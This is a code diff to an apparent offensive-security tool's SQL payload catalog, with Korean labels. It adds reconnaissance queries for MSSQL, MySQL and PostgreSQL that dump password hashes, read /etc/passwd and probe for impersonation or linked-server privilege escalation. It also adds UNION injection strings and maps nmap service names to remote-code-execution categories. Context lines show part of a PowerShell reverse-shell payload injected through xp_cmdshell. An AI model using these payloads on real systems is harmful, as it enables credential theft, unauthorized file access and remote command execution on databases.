@@ -118,6 +118,32 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
     ],
   },
   {
+    id: "mssql-basics",
+    title: "MSSQL 기초 문법 · 정찰",
+    engines: ["mssql"],
+    description: "xp_cmdshell로 넘어가기 전에 먼저 확인할 기본 정보 수집 쿼리입니다. 링크된 서버나 " +
+      "impersonation은 AD 환경에서 흔한 추가 권한 상승 경로입니다.",
+    payloads: [
+      { label: "버전 확인", context: "direct", payload: "SELECT @@version;" },
+      { label: "현재 사용자", context: "direct", payload: "SELECT SYSTEM_USER;" },
+      { label: "현재 데이터베이스", context: "direct", payload: "SELECT DB_NAME();" },
+      { label: "sysadmin 여부 확인", context: "direct",
+        payload: "SELECT IS_SRVROLEMEMBER('sysadmin');" },
+      { label: "데이터베이스 목록", context: "direct", payload: "SELECT name FROM sys.databases;" },
+      { label: "테이블 목록", context: "direct",
+        payload: "SELECT table_name FROM information_schema.tables;" },
+      { label: "로그인 계정 해시 (sysadmin 필요)", context: "direct",
+        payload: "SELECT name, password_hash FROM sys.sql_logins;" },
+      { label: "링크된 서버 목록", context: "direct", payload: "EXEC sp_linkedservers;",
+        note: "링크된 서버가 있으면 openquery()로 그 서버에서 쿼리·명령 실행을 시도할 수 있습니다." },
+      { label: "impersonation 가능한 계정 확인", context: "direct",
+        payload: "SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';",
+        note: "가능하면 EXECUTE AS LOGIN = '<계정명>'; 으로 권한을 승격할 수 있습니다." },
+      { label: "인젝션 컨텍스트 (버전 UNION 추출)", context: "injection",
+        payload: "' UNION SELECT @@version,NULL,NULL--" },
+    ],
+  },
+  {
     id: "mssql-xp-cmdshell",
     title: "MSSQL xp_cmdshell",
     engines: ["mssql"],
@@ -150,6 +176,30 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
           "$r2=$r+\\\"PS \\\"+(pwd).Path+\\\"> \\\";$sb=([Text.Encoding]::ASCII).GetBytes($r2);" +
           "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"'-- -",
         note: "위 항목과 같은 페이로드를 stacked query 인젝션 컨텍스트에 맞춰 앞뒤만 감쌌습니다." },
+    ],
+  },
+  {
+    id: "mysql-basics",
+    title: "MySQL 기초 문법 · 정찰",
+    engines: ["mysql"],
+    description: "OUTFILE 웹셸이나 UDF로 넘어가기 전에 먼저 확인할 기본 정보 수집 쿼리입니다.",
+    payloads: [
+      { label: "버전 확인", context: "direct", payload: "SELECT version();" },
+      { label: "현재 사용자", context: "direct", payload: "SELECT current_user();" },
+      { label: "현재 데이터베이스", context: "direct", payload: "SELECT database();" },
+      { label: "데이터베이스 목록", context: "direct", payload: "SHOW DATABASES;" },
+      { label: "테이블 목록", context: "direct",
+        payload: "SELECT table_name FROM information_schema.tables WHERE table_schema=database();" },
+      { label: "계정 비밀번호 해시 (5.7+)", context: "direct",
+        payload: "SELECT user, authentication_string FROM mysql.user;",
+        note: "5.6 이하는 authentication_string 대신 password 컬럼을 쓰는 경우가 있습니다." },
+      { label: "권한 확인", context: "direct", payload: "SHOW GRANTS;" },
+      { label: "FILE 권한 여부 확인", context: "direct",
+        payload: "SELECT * FROM information_schema.user_privileges WHERE privilege_type='FILE';" },
+      { label: "파일 읽기 (FILE 권한 필요)", context: "direct",
+        payload: "SELECT LOAD_FILE('/etc/passwd');" },
+      { label: "인젝션 컨텍스트 (버전 UNION 추출)", context: "injection",
+        payload: "' UNION SELECT version(),NULL,NULL-- -" },
     ],
   },
   {
@@ -203,6 +253,35 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
     ],
   },
   {
+    id: "postgres-basics",
+    title: "PostgreSQL 기초 문법 · 정찰",
+    engines: ["postgresql"],
+    description: "COPY FROM PROGRAM으로 넘어가기 전에 먼저 확인할 기본 정보 수집 쿼리입니다. 이미 " +
+      "쿼리 인터페이스가 있거나 UNION으로 결과를 뽑아낼 수 있을 때 그대로 사용하세요.",
+    payloads: [
+      { label: "버전 확인", context: "direct", payload: "SELECT version();" },
+      { label: "현재 사용자", context: "direct", payload: "SELECT current_user;" },
+      { label: "현재 데이터베이스", context: "direct", payload: "SELECT current_database();" },
+      { label: "superuser 여부 확인", context: "direct",
+        payload: "SELECT usesuper FROM pg_user WHERE usename = current_user;",
+        note: "COPY FROM PROGRAM은 superuser 권한이 필요합니다." },
+      { label: "데이터베이스 목록", context: "direct", payload: "SELECT datname FROM pg_database;" },
+      { label: "테이블 목록 (현재 스키마)", context: "direct",
+        payload: "SELECT table_name FROM information_schema.tables WHERE table_schema='public';" },
+      { label: "계정 비밀번호 해시 (superuser 필요)", context: "direct",
+        payload: "SELECT usename, passwd FROM pg_shadow;",
+        note: "pg_shadow는 superuser만 조회 가능합니다. 해시 형식은 md5<32자> 또는 " +
+          "SCRAM-SHA-256입니다." },
+      { label: "파일 읽기 (superuser 필요)", context: "direct",
+        payload: "SELECT pg_read_file('/etc/passwd');",
+        note: "PostgreSQL 9.x 이하는 상대 경로만, 이후 버전은 절대 경로도 허용될 수 있습니다." },
+      { label: "파일 쓰기", context: "direct", payload: "COPY (SELECT 'test') TO '/tmp/test.txt';",
+        note: "COPY FROM PROGRAM(명령 실행)과 반대 방향입니다 -- 결과를 파일로 저장할 때." },
+      { label: "인젝션 컨텍스트 (버전 UNION 추출)", context: "injection",
+        payload: "' UNION SELECT version(),NULL,NULL-- -" },
+    ],
+  },
+  {
     id: "postgres-copy-program",
     title: "PostgreSQL COPY FROM PROGRAM",
     engines: ["postgresql"],
@@ -252,16 +331,17 @@ export const findSqlPayloadCategory = (id: string) =>
 // service.name values match nmap's own service-detection strings, same as
 // backend/templates/services.yaml's `database:` match list -- reused here
 // so a DB-shaped service (already authenticated, no injection point in
-// play) can offer only the "type this straight into the client" payloads,
-// never the break-out-of-a-web-parameter injection variants.
-const dbRceCategoryIds: Record<string, string[]> = {
-  postgresql: ["postgres-copy-program"],
-  mysql: ["mysql-outfile-webshell", "mysql-udf-rce"],
-  "ms-sql-s": ["mssql-xp-cmdshell"],
+// play) can offer only the "type this straight into the client" payloads
+// (recon/basics plus RCE), never the break-out-of-a-web-parameter
+// injection variants.
+const dbPayloadCategoryIds: Record<string, string[]> = {
+  postgresql: ["postgres-basics", "postgres-copy-program"],
+  mysql: ["mysql-basics", "mysql-outfile-webshell", "mysql-udf-rce"],
+  "ms-sql-s": ["mssql-basics", "mssql-xp-cmdshell"],
 };
 
-export function dbRceCategoriesFor(serviceName: string): SqlPayloadCategory[] {
-  const ids = dbRceCategoryIds[serviceName.toLowerCase()];
+export function dbPayloadCategoriesFor(serviceName: string): SqlPayloadCategory[] {
+  const ids = dbPayloadCategoryIds[serviceName.toLowerCase()];
   if (!ids) return [];
   return ids
     .map((id) => findSqlPayloadCategory(id))
